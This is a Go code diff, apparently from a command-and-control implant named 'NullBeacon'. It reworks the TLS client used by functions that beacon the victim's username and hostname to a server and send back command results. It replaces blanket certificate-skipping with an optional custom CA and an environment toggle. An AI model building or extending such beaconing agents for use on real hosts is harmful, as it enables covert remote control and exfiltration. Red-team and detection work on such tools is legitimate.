@@ -2,10 +2,38 @@ package main
 
 import (
 	"crypto/tls"
+	"crypto/x509"
 	"io"
 	"net/http"
+	"os"
 	"strings"
+	"time"
 )
+
+func newHTTPClient() *http.Client {
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			MinVersion: tls.VersionTLS12,
+		},
+	}
+
+	if strings.EqualFold(os.Getenv("NULLBEACON_INSECURE_TLS"), "true") {
+		transport.TLSClientConfig.InsecureSkipVerify = true
+		return &http.Client{Timeout: 10 * time.Second, Transport: transport}
+	}
+
+	if certPath := strings.TrimSpace(os.Getenv("NULLBEACON_CA_CERT")); certPath != "" {
+		certPEM, err := os.ReadFile(certPath)
+		if err == nil {
+			pool := x509.NewCertPool()
+			if pool.AppendCertsFromPEM(certPEM) {
+				transport.TLSClientConfig.RootCAs = pool
+			}
+		}
+	}
+
+	return &http.Client{Timeout: 10 * time.Second, Transport: transport}
+}
 
 func beaconHTTP(serverAddr, agentID, username, hostname string) (string, error) {
 	url := "https://" + serverAddr + activeProfile.BeaconURL
@@ -15,11 +43,7 @@ func beaconHTTP(serverAddr, agentID, username, hostname string) (string, error) 
 		return "", err
 	}
 	req.Header.Set("User-Agent", activeProfile.UserAgent)
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
+	client := newHTTPClient()
 	resp, err := client.Do(req)
 	if err != nil {
 		return "", err
@@ -40,11 +64,7 @@ func sendResult(serverAddr, agentID, output string) error {
 		return err
 	}
 	req.Header.Set("User-Agent", activeProfile.UserAgent)
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
+	client := newHTTPClient()
 	resp, err := client.Do(req)
 	if err != nil {
 		return err
